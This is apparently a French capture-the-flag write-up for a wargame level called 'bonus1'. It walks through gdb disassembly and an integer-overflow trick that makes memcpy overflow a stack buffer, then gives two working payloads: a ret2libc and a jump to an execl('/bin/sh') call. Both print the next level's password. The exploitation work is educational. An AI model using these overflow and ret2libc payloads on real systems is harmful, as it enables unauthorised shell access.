On se connecte sur le bonus1, ou se trouve un **binaire** <code>bonus1</code>.

On cherche a savoir ce que fait ce binaire:

```gdb
> gdb -q bonus1
Reading symbols from /home/user/bonus1/bonus1...(no debugging symbols found)...done.
(gdb) > disas main
Dump of assembler code for function main:
   0x08048424 <+0>:     push   %ebp
   0x08048425 <+1>:     mov    %esp,%ebp
   0x08048427 <+3>:     and    $0xfffffff0,%esp
   0x0804842a <+6>:     sub    $0x40,%esp
   0x0804842d <+9>:     mov    0xc(%ebp),%eax
   0x08048430 <+12>:    add    $0x4,%eax
   0x08048433 <+15>:    mov    (%eax),%eax
   0x08048435 <+17>:    mov    %eax,(%esp)
   0x08048438 <+20>:    call   0x8048360 <atoi@plt>
   0x0804843d <+25>:    mov    %eax,0x3c(%esp)
   0x08048441 <+29>:    cmpl   $0x9,0x3c(%esp)
   0x08048446 <+34>:    jle    0x804844f <main+43>
   0x08048448 <+36>:    mov    $0x1,%eax
   0x0804844d <+41>:    jmp    0x80484a3 <main+127>
   0x0804844f <+43>:    mov    0x3c(%esp),%eax
   0x08048453 <+47>:    lea    0x0(,%eax,4),%ecx
   0x0804845a <+54>:    mov    0xc(%ebp),%eax
   0x0804845d <+57>:    add    $0x8,%eax
   0x08048460 <+60>:    mov    (%eax),%eax
   0x08048462 <+62>:    mov    %eax,%edx
   0x08048464 <+64>:    lea    0x14(%esp),%eax
   0x08048468 <+68>:    mov    %ecx,0x8(%esp)
   0x0804846c <+72>:    mov    %edx,0x4(%esp)
   0x08048470 <+76>:    mov    %eax,(%esp)
   0x08048473 <+79>:    call   0x8048320 <memcpy@plt>
   0x08048478 <+84>:    cmpl   $0x574f4c46,0x3c(%esp)
   0x08048480 <+92>:    jne    0x804849e <main+122>
   0x08048482 <+94>:    movl   $0x0,0x8(%esp)
   0x0804848a <+102>:   movl   $0x8048580,0x4(%esp)
   0x08048492 <+110>:   movl   $0x8048583,(%esp)
   0x08048499 <+117>:   call   0x8048350 <execl@plt>
   0x0804849e <+122>:   mov    $0x0,%eax
   0x080484a3 <+127>:   leave
   0x080484a4 <+128>:   ret
End of assembler dump.
```

Après analyse du fichier (**source.c**), on se rend compte que l'exploitation du fichier se fera par la fonction **memcpy**.  
On remarque qu'il y a une condition précisant que n doit être inférieur a 10, mais on souhaite faire overflow **memcpy** avec notre (n * 4), en sachant que notre buffer est de 40 et que notre ret2libc fait 12 bytes, on a donc besoin de minimum 52/4. On cherche donc un nombre négatif qui en underflow donne au moins 13.

```c
#include <limits.h>

int main(){
	int i;
	int res;

	i = -1;
	res = i * 4; 
	while(res < 0 || res > 68){
		i--;
		res = i * 4;
	}
	printf("res = %d\n", res);
	printf("i = %d\n", i);
}

> ./a.out
res = 68
i = -1073741807
```
On cherche l'offset : 

```gdb
(gdb) > b * 0x08048473
Breakpoint 1 at 0x8048473
(gdb) run -1073741799 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
Starting program: /home/user/bonus1/bonus1 -1073741799 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz

Breakpoint 1, 0x08048473 in main ()
(gdb) > ni
0x08048478 in main ()
(gdb) > i f
Stack level 0, frame at 0xbffff5e0:
 eip = 0x8048478 in main; saved eip 0x4f4f4f4f
 Arglist at 0xbffff5d8, args:
 Locals at 0xbffff5d8, Previous frame's sp is 0xbffff5e0
 Saved registers:
  ebp at 0xbffff5d8, eip at 0xbffff5dc
```
On voit que l'eip s'est fait override par les 4f, donc les O.
Donc notre offset est de 56.

A partir d'ici, nous avons plusieurs possibilités, soit un ret2libc, soit envoyer a l'adresse 0x08048482 qui va executer le **/bin/sh**.

# Première solution

<pre><code>> ./bonus1 -1073741807 $(python -c "print 'B' * 56 + '\x60\xb0\xe6\xb7' + '\xe0\xeb\xe5\xb7' + '\x83\x85\x04\x08'")
$ cd ../bonus2 && cat .pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245</code></pre>

> Adresse de system : 0xb7e6b060
>
> Adresse de exit : 0xb7e5ebe0
>
> Adresse de /bin/sh : 0x08048583

# Deuxième solution

<pre><code>
./bonus1 -1073741807 $(python -c "print 'B' * 56 + '\x82\x84\x04\x08'")
$ cd ../bonus2 && cat .pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
</code></pre>


For download :
<pre><code>scp -P4242 bonus1@IP:bonus1 .</code></pre>
> Password : cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9

